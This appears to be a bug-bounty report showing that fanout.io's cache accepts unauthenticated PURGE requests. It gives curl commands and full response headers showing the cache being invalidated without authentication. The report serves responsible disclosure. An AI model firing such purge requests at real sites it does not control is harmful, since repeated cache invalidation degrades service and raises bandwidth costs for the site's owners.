## Original Report

## Summary:
Anyone can issue a PURGE request for any resource and invalidate your caches. That can lead to increased bandwidth costs but also potential Denial of Service attacks.

## Steps To Reproduce:

  1. Fetching the resource headers, we can see in the X-Cache that the resource was a HIT with X-Cache-Hits: 5:
Put the below command in the terminal (this is request):
# curl -s -D - https://fanout.io -o /dev/null
HTTP/2 200
server: nginx/1.14.0 (Ubuntu)
content-type: text/html; charset=utf-8
x-frame-options: DENY
x-content-type-options: nosniff
accept-ranges: bytes
date: Wed, 12 Apr 2023 00:05:08 GMT
via: 1.1 varnish
age: 1215
x-served-by: cache-maa10224-MAA
x-cache: HIT
x-cache-hits: 5
x-timer: S1681257908.308066,VS0,VE0
vary: Cookie
content-length: 20567

  2. Then put the below command to purge the cache as an unauthenticated user. And see the result, Status is OK means it successfully deletes the cache without authentication.
# curl -X PURGE https://fanout.io
{ "status": "ok", "id": "10234-1680248948-114138" }

  3. Now again fire the first command to see the x-cache-hits. See, the x-cache-hits is 1 now.
# curl -s -D - https://fanout.io -o /dev/null
HTTP/2 200
server: nginx/1.14.0 (Ubuntu)
content-type: text/html; charset=utf-8
x-frame-options: DENY
x-content-type-options: nosniff
accept-ranges: bytes
date: Wed, 12 Apr 2023 00:06:01 GMT
via: 1.1 varnish
age: 8
x-served-by: cache-maa10233-MAA
x-cache: HIT
x-cache-hits: 1
x-timer: S1681257962.998849,VS0,VE1
vary: Cookie
content-length: 20567

## Impact

This can lead to increased bandwidth costs and degraded application performance. Allowing anonymous users to purge cache could be used to maliciously degrade performance.
